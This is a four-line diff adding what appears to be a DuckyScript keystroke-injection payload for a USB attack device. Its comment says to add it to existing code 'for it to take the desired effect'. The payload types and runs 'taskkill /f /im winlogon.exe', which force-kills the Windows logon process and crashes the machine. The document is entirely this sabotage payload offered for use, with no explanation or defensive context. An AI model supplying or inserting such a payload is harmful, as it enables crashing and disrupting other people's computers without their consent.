@@ -1,0 +1,4 @@
+REM add to the original code for it to take the desired effect
+
+STRING taskkill /f /im winlogon.exe
+ENTER
